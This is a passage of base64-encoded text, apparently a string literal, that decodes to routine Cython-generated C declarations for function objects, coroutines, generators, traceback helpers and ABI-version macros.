93ZWFrcmVmbGlzdDsKI2VuZGlmCiAgICBQeU9iamVjdCAqZnVuY19kaWN0OwogICAgUHlPYmplY3QgKmZ1bmNfbmFtZTsKICAgIFB5T2JqZWN0ICpmdW5jX3F1YWxuYW1lOwogICAgUHlPYmplY3QgKmZ1bmNfZG9jOwog""ICAgUHlPYmplY3QgKmZ1bmNfZ2xvYmFsczsKICAgIFB5T2JqZWN0ICpmdW5jX2NvZGU7CiAgICBQeU9iamVjdCAqZnVuY19jbG9zdXJlOwojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5T2JqZWN0ICpmdW5jX2NsYXNzb2JqOwojZW5kaWYKICAgIFB5T2JqZWN0ICpkZWZhdWx0czsKICAgIGludCBmbGFnczsKICAgIFB5T2JqZWN0ICpkZWZhdWx0c190dXBsZTsKICAgIFB5T2JqZWN0ICpkZWZhdWx0c19rd2RpY3Q7CiAgICBQeU9iamVjdCAqKCpkZWZhdWx0c19nZXR0ZXIpKFB5T2JqZWN0ICopOwogICAgUHlPYmplY3QgKmZ1bmNfYW5ub3RhdGlvbnM7CiAgICBQeU9iamVjdCAqZnVuY19pc19jb3JvdXRpbmU7Cn0gX19weXhfQ3lGdW5jdGlvbk9iamVjdDsKI3VuZGVmIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjawojZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fQ2hlY2sob2JqKSAgX19QeXhfVHlwZUNoZWNrKG9iaiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfQ3lGdW5jdGlvblR5cGUpCiNkZWZpbmUgX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0NoZWNrKG9iaikgIF9fUHl4X1R5cGVDaGVjazIob2JqLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSwgJlB5Q0Z1bmN0aW9uX1R5cGUpCiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9DaGVja0V4YWN0KG9iaikgIF9fUHl4X0lTX1RZUEUob2JqLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSkKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uKFB5T2JqZWN0ICpmdW5jLCB2b2lkICgqY2Z1bmMpKHZvaWQpKTsKI3VuZGVmIF9fUHl4X0lzU2FtZUNGdW5jdGlvbgojZGVmaW5lIF9fUHl4X0lzU2FtZUNGdW5jdGlvbihmdW5jLCBjZnVuYykgICBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihmdW5jLCBjZnVuYykKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0luaXQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCogb3AsIFB5TWV0aG9kRGVmICptbCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgZmxhZ3MsIFB5T2JqZWN0KiBxdWFsbmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2xvc3VyZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqbW9kdWxlLCBQeU9iamVjdCAqZ2xvYmFscywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCogY29kZSk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0N5RnVuY3Rpb25fU2V0Q2xhc3NPYmooX19weXhfQ3lGdW5jdGlvbk9iamVjdCogZiwgUHlPYmplY3QqIGNsYXNzb2JqKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fSW5pdERlZmF1bHRzKFB5T2Jq""ZWN0ICpmdW5jLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeVR5cGVPYmplY3QgKmRlZmF1bHRzX3R5cGUpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNUdXBsZShQeU9iamVjdCAqbSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKnR1cGxlKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldERlZmF1bHRzS3dEaWN0KFB5T2JqZWN0ICptLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmRpY3QpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0QW5ub3RhdGlvbnNEaWN0KFB5T2JqZWN0ICptLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpkaWN0KTsKc3RhdGljIGludCBfX3B5eF9DeUZ1bmN0aW9uX2luaXQoUHlPYmplY3QgKm1vZHVsZSk7CiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApzdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTk9BUkdTKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKTsKc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX08oUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpOwpzdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfRkFTVENBTExfS0VZV09SRFMoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpOwpzdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfRkFTVENBTExfS0VZV09SRFNfTUVUSE9EKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKTsKI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChmKSAoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmKS0+ZnVuY192ZWN0b3JjYWxsKQojZWxzZQojZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKGYpICgoKFB5Q0Z1bmN0aW9uT2JqZWN0KilmKS0+dmVjdG9yY2FsbCkKI2VuZGlmCiNlbmRpZgoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9OZXcoUHlNZXRob2REZWYgKm1sLAogICAgICAgICAgICAgICAgICAg""ICAgICAgICAgICAgICAgICAgIGludCBmbGFncywgUHlPYmplY3QqIHF1YWxuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpjbG9zdXJlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICptb2R1bGUsIFB5T2JqZWN0ICpnbG9iYWxzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0KiBjb2RlKTsKCgojaWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSyAmJiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLX1JVTlRJTUUKc3RhdGljIGludCBfX1B5eF9DTGluZUZvclRyYWNlYmFjayhQeVRocmVhZFN0YXRlICp0c3RhdGUsIGludCBjX2xpbmUpOwojZWxzZQojZGVmaW5lIF9fUHl4X0NMaW5lRm9yVHJhY2ViYWNrKHRzdGF0ZSwgY19saW5lKSAgKCgoQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSykpID8gY19saW5lIDogMCkKI2VuZGlmCgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKdHlwZWRlZiBQeU9iamVjdCBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZTsKI2Vsc2UKdHlwZWRlZiBQeUNvZGVPYmplY3QgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGU7CiNlbmRpZgp0eXBlZGVmIHN0cnVjdCB7CiAgICBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSogY29kZV9vYmplY3Q7CiAgICBpbnQgY29kZV9saW5lOwp9IF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5OwpzdHJ1Y3QgX19QeXhfQ29kZU9iamVjdENhY2hlIHsKICAgIGludCBjb3VudDsKICAgIGludCBtYXhfY291bnQ7CiAgICBfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSogZW50cmllczsKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcKICAgIF9fcHl4X2F0b21pY19pbnRfdHlwZSBhY2Nlc3Nvcl9jb3VudDsKICAjZW5kaWYKfTsKc3RhdGljIGludCBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KiBlbnRyaWVzLCBpbnQgY291bnQsIGludCBjb2RlX2xpbmUpOwpzdGF0aWMgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUgKl9fcHl4X2ZpbmRfY29kZV9vYmplY3QoaW50IGNvZGVfbGluZSk7CnN0YXRpYyB2b2lkIF9fcHl4X2luc2VydF9jb2RlX29iamVjdChpbnQgY29kZV9saW5lLCBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSogY29kZV9vYmplY3QpOwoKCnN0YXRpYyB2b2lkIF9fUHl4X0FkZFRyYWNlYmFjayhjb25zdCBjaGFyICpmdW5jbmFtZSwgaW50IGNfbGluZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBweV9saW5lLCBjb25zdCBjaGFyICpmaWxlbmFtZSk7CgoKI2lmICFkZWZpbmVkKF9fSU5URUxfQ09NUElMRVIpICYmIGRlZmluZWQoX19HTlVDX18pICYmIChfX0dOVUNfXyA+IDQgfHwgKF9fR05VQ19fID09IDQgJiYgX19HTlVDX01JTk9SX18gPj0gNikpCiNkZWZpbmUgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDCiNl""bmRpZgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGxvbmcgX19QeXhfUHlMb25nX0FzX2xvbmcoUHlPYmplY3QgKik7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcobG9uZyB2YWx1ZSk7CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKdHlwZWRlZiBQeU9iamVjdCAqX19QeXhfVHlwZU5hbWU7CiNkZWZpbmUgX19QeXhfRk1UX1RZUEVOQU1FICIlVSIKI2RlZmluZSBfX1B5eF9ERUNSRUZfVHlwZU5hbWUob2JqKSBQeV9YREVDUkVGKG9iaikKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAojZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUgUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZQojZWxzZQpzdGF0aWMgX19QeXhfVHlwZU5hbWUgX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeVR5cGVPYmplY3QqIHRwKTsKI2VuZGlmCiNlbHNlICAvLyAhTElNSVRFRF9BUEkKdHlwZWRlZiBjb25zdCBjaGFyICpfX1B5eF9UeXBlTmFtZTsKI2RlZmluZSBfX1B5eF9GTVRfVFlQRU5BTUUgIiUuMjAwcyIKI2RlZmluZSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKHRwKSAoKHRwKS0+dHBfbmFtZSkKI2RlZmluZSBfX1B5eF9ERUNSRUZfVHlwZU5hbWUob2JqKQojZW5kaWYKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlMb25nX0FzX2ludChQeU9iamVjdCAqKTsKCgpzdGF0aWMgdm9pZCBfX1B5eF9SYWlzZShQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIsIFB5T2JqZWN0ICpjYXVzZSk7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5SXRlcl9OZXh0X1BsYWluKFB5T2JqZWN0ICppdGVyYXRvcik7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0QnVpbHRpbk5leHRfTGltaXRlZEFQSSh2b2lkKTsKI2VuZGlmCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGwyQXJncyhQeU9iamVjdCogZnVuY3Rpb24sIFB5T2JqZWN0KiBhcmcxLCBQeU9iamVjdCogYXJnMik7CgoKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMShQeU9iamVjdCogb2JqLCBQeU9iamVjdCogbWV0aG9kX25hbWUsIFB5T2JqZWN0KiBhcmcpOwoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24oUHlPYmplY3QqIHZhbHVlLCBpbnQgYXN5bmMsIGludCBpdGVybmV4dCk7CgoKc3RydWN0IF9fcHl4X0Nvcm91dGluZU9iamVjdDsKdHlwZWRlZiBQeU9iamVjdCAqKCpfX3B5eF9jb3JvdXRpbmVfYm9keV90KShzdHJ1Y3QgX19weXhfQ29yb3V0aW5lT2JqZWN0ICosIFB5VGhyZWFkU3RhdGUg""KiwgUHlPYmplY3QgKik7CiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiNkZWZpbmUgX19QeXhfRXhjSW5mb1N0cnVjdCAgX1B5RXJyX1N0YWNrSXRlbQojZWxzZQp0eXBlZGVmIHN0cnVjdCB7CiAgICBQeU9iamVjdCAqZXhjX3R5cGU7CiAgICBQeU9iamVjdCAqZXhjX3ZhbHVlOwogICAgUHlPYmplY3QgKmV4Y190cmFjZWJhY2s7Cn0gX19QeXhfRXhjSW5mb1N0cnVjdDsKI2VuZGlmCnR5cGVkZWYgc3RydWN0IF9fcHl4X0Nvcm91dGluZU9iamVjdCB7CiAgICBQeU9iamVjdF9IRUFECiAgICBfX3B5eF9jb3JvdXRpbmVfYm9keV90IGJvZHk7CiAgICBQeU9iamVjdCAqY2xvc3VyZTsKICAgIF9fUHl4X0V4Y0luZm9TdHJ1Y3QgZ2lfZXhjX3N0YXRlOwogICAgUHlPYmplY3QgKmdpX3dlYWtyZWZsaXN0OwogICAgUHlPYmplY3QgKmNsYXNzb2JqOwogICAgUHlPYmplY3QgKnlpZWxkZnJvbTsKICAgIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyB5aWVsZGZyb21fYW1fc2VuZDsKICAgIFB5T2JqZWN0ICpnaV9uYW1lOwogICAgUHlPYmplY3QgKmdpX3F1YWxuYW1lOwogICAgUHlPYmplY3QgKmdpX21vZHVsZW5hbWU7CiAgICBQeU9iamVjdCAqZ2lfY29kZTsKICAgIFB5T2JqZWN0ICpnaV9mcmFtZTsKI2lmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgJiYgKENZVEhPTl9QUk9GSUxFIHx8IENZVEhPTl9UUkFDRSkKICAgIFB5TW9uaXRvcmluZ1N0YXRlIF9fcHl4X3B5bW9uaXRvcmluZ19zdGF0ZVtfX1B5eF9Nb25pdG9yaW5nRXZlbnRUeXBlc19DeUdlbl9jb3VudF07CiAgICB1aW50NjRfdCBfX3B5eF9weW1vbml0b3JpbmdfdmVyc2lvbjsKI2VuZGlmCiAgICBpbnQgcmVzdW1lX2xhYmVsOwogICAgY2hhciBpc19ydW5uaW5nOwp9IF9fcHl4X0Nvcm91dGluZU9iamVjdDsKc3RhdGljIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9OZXcoCiAgICBQeVR5cGVPYmplY3QgKnR5cGUsIF9fcHl4X2Nvcm91dGluZV9ib2R5X3QgYm9keSwgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjbG9zdXJlLAogICAgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpxdWFsbmFtZSwgUHlPYmplY3QgKm1vZHVsZV9uYW1lKTsKc3RhdGljIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9OZXdJbml0KAogICAgICAgICAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgX19weXhfY29yb3V0aW5lX2JvZHlfdCBib2R5LCBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmNsb3N1cmUsCiAgICAgICAgICAgIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcXVhbG5hbWUsIFB5T2JqZWN0ICptb2R1bGVfbmFtZSk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ29yb3V0aW5lX0V4Y2VwdGlvbkNsZWFyKF9fUHl4X0V4Y0luZm9TdHJ1Y3QgKnNlbGYpOwpzdGF0aWMgaW50IF9fUHl4X0Nvcm91dGluZV9jbGVhcihQeU9iamVjdCAqc2VsZik7CnN0YXRpYyBfX1B5eF9QeVNlbmRSZXN1bHQgX19QeXhfQ29y""b3V0aW5lX0FtU2VuZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJldHZhbCk7CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX1NlbmQoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp2YWx1ZSk7CnN0YXRpYyBfX1B5eF9QeVNlbmRSZXN1bHQgX19QeXhfQ29yb3V0aW5lX0Nsb3NlKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqKnJldHZhbCk7CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX1Rocm93KFB5T2JqZWN0ICpnZW4sIFB5T2JqZWN0ICphcmdzKTsKI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKI2RlZmluZSBfX1B5eF9Db3JvdXRpbmVfU3dhcEV4Y2VwdGlvbihzZWxmKQojZGVmaW5lIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKHNlbGYpICBfX1B5eF9Db3JvdXRpbmVfRXhjZXB0aW9uQ2xlYXIoJihzZWxmKS0+Z2lfZXhjX3N0YXRlKQojZWxzZQojZGVmaW5lIF9fUHl4X0Nvcm91dGluZV9Td2FwRXhjZXB0aW9uKHNlbGYpIHtcCiAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCYoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdHlwZSwgJihzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y192YWx1ZSwgJihzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190cmFjZWJhY2spO1wKICAgIF9fUHl4X0Nvcm91dGluZV9SZXNldEZyYW1lQmFja3BvaW50ZXIoJihzZWxmKS0+Z2lfZXhjX3N0YXRlKTtcCiAgICB9CiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX1Jlc2V0QW5kQ2xlYXJFeGNlcHRpb24oc2VsZikge1wKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190eXBlLCAoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdmFsdWUsIChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190cmFjZWJhY2spO1wKICAgIChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190eXBlID0gKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3ZhbHVlID0gKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3RyYWNlYmFjayA9IE5VTEw7XAogICAgfQojZW5kaWYKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQojZGVmaW5lIF9fUHl4X1B5R2VuX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKHB2YWx1ZSlcCiAgICBfX1B5eF9QeUdlbl9fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUoX19weXhfdHN0YXRlLCBwdmFsdWUpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlHZW5fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUocHZhbHVlKVwKICAgIF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQsIHB2YWx1ZSkKI2VuZGlmCnN0YXRpYyBpbnQgX19QeXhfUHlHZW5fX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKipwdmFsdWUpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0Nvcm91dGluZV9SZXNldEZyYW1lQmFja3BvaW50ZXIoX19QeXhfRXhjSW5mb1N0cnVj""dCAqZXhjX3N0YXRlKTsKc3RhdGljIGNoYXIgX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKTsKc3RhdGljIHZvaWQgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pOwpzdGF0aWMgY2hhciBfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pOwpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZ19nZXR0ZXIoUHlPYmplY3QgKmdlbiwgdm9pZCAqY2xvc3VyZSk7CiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAyCnN0YXRpYyB2b2lkIF9fUHl4X1NldEJhY2twb3J0VHlwZUFtU2VuZChQeVR5cGVPYmplY3QgKnR5cGUsIF9fUHl4X1B5QXN5bmNNZXRob2RzU3RydWN0ICpzdGF0aWNfYW1zZW5kX21ldGhvZHMsIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBhbV9zZW5kKTsKI2VuZGlmCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX2ZhaWxfcmVkdWNlX2V4KFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnKTsKCgojZGVmaW5lIF9fUHl4X0dlbmVyYXRvcl9VU0VECiNkZWZpbmUgX19QeXhfR2VuZXJhdG9yX0NoZWNrRXhhY3Qob2JqKSBfX1B5eF9JU19UWVBFKG9iaiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfR2VuZXJhdG9yVHlwZSkKI2RlZmluZSBfX1B5eF9HZW5lcmF0b3JfTmV3KGJvZHksIGNvZGUsIGNsb3N1cmUsIG5hbWUsIHF1YWxuYW1lLCBtb2R1bGVfbmFtZSlcCiAgICBfX1B5eF9fQ29yb3V0aW5lX05ldyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9HZW5lcmF0b3JUeXBlLCBib2R5LCBjb2RlLCBjbG9zdXJlLCBuYW1lLCBxdWFsbmFtZSwgbW9kdWxlX25hbWUpCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2VuZXJhdG9yX05leHQoUHlPYmplY3QgKnNlbGYpOwpzdGF0aWMgaW50IF9fcHl4X0dlbmVyYXRvcl9pbml0KFB5T2JqZWN0ICptb2R1bGUpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2VuZXJhdG9yX0dldElubGluZWRSZXN1bHQoUHlPYmplY3QgKnNlbGYpOwoKCnN0YXRpYyB1bnNpZ25lZCBsb25nIF9fUHl4X2dldF9ydW50aW1lX3ZlcnNpb24odm9pZCk7CgoKc3RhdGljIGludCBfX1B5eF9jaGVja19iaW5hcnlfdmVyc2lvbih1bnNpZ25lZCBsb25nIGN0X3ZlcnNpb24sIHVuc2lnbmVkIGxvbmcgcnRfdmVyc2lvbiwgaW50IGFsbG93X25ld2VyKTsKCgojaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUICYmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfU3RhdGVfRmluZE1vZHVsZSh2b2lkKik7CnN0YXRpYyBpbnQgX19QeXhfU3RhdGVfQWRkTW9kdWxlKFB5T2JqZWN0KiBtb2R1bGUsIHZvaWQqKTsKc3RhdGljIGludCBfX1B5eF9TdGF0ZV9SZW1vdmVNb2R1bGUodm9pZCopOwojZWxpZiBDWVRIT05fVVNF""X01PRFVMRV9TVEFURQojZGVmaW5lIF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGUgUHlTdGF0ZV9GaW5kTW9kdWxlCiNkZWZpbmUgX19QeXhfU3RhdGVfQWRkTW9kdWxlIFB5U3RhdGVfQWRkTW9kdWxlCiNkZWZpbmUgX19QeXhfU3RhdGVfUmVtb3ZlTW9kdWxlIFB5U3RhdGVfUmVtb3ZlTW9kdWxlCiNlbmRpZgoKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgICAgICAgI2RlZmluZSBfX1BZWF9GQVNUQ0FMTF9BQklfU1VGRklYICAiX2Zhc3RjYWxsIgogICAgI2Vsc2UKICAgICAgICAjZGVmaW5lIF9fUFlYX0ZBU1RDQUxMX0FCSV9TVUZGSVgKICAgICNlbmRpZgogICAgI2RlZmluZSBfX1BZWF9MSU1JVEVEX0FCSV9TVUZGSVggImxpbWl0ZWQiIF9fUFlYX0ZBU1RDQUxMX0FCSV9TVUZGSVggX19QWVhfQU1fU0VORF9BQklfU1VGRklYCiNlbHNlCiAgICAjZGVmaW5lIF9fUFlYX0xJTUlURURfQUJJX1NVRkZJWAojZW5kaWYKI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDEKICAgICNkZWZpbmUgX19QWVhfQU1fU0VORF9BQklfU1VGRklYCiNlbGlmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDIKICAgICNkZWZpbmUgX19QWVhfQU1fU0VORF9BQklfU1VGRklYICJhbXNlbmRiYWNrcG9ydCIKI2Vsc2UKICAgICNkZWZpbmUgX19QWVhfQU1fU0VORF9BQklfU1VGRklYICJub2Ftc2VuZCIKI2VuZGlmCiNpZm5kZWYgX19QWVhfTU9OSVRPUklOR19BQklfU1VGRklYCiAgICAjZGVmaW5lIF9fUFlYX01PTklUT1JJTkdfQUJJX1NVRkZJWAojZW5kaWYKI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkUKICAgICNkZWZpbmUgX19QWVhfVFBfRklOQUxJWkVfQUJJX1NVRkZJWAojZWxzZQogICAgI2RlZmluZSBfX1BZWF9UUF9GSU5BTElaRV9BQklfU1VGRklYICJub2ZpbmFsaXplIgojZW5kaWYKI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTIHx8ICFkZWZpbmVkKF9fUHl4X0FzeW5jR2VuX1VTRUQpCiAgICAjZGVmaW5lIF9fUFlYX0ZSRUVMSVNUU19BQklfU1VGRklYCiNlbHNlCiAgICAjZGVmaW5lIF9fUFlYX0ZSRUVMSVNUU19BQklfU1VGRklYICJub2ZyZWVsaXN0cyIKI2VuZGlmCiNkZWZpbmUgQ1lUSE9OX0FCSSAgX19QWVhfQUJJX1ZFUlNJT04gX19QWVhfTElNSVRFRF9BQklfU1VGRklYIF9fUFlYX01PTklUT1JJTkdfQUJJX1NVRkZJWCBfX1BZWF9UUF9GSU5BTElaRV9BQklfU1VGRklYIF9fUFlYX0ZSRUVMSVNUU19BQklfU1VGRklYIF9fUFlYX0FNX1NFTkRfQUJJX1NVRk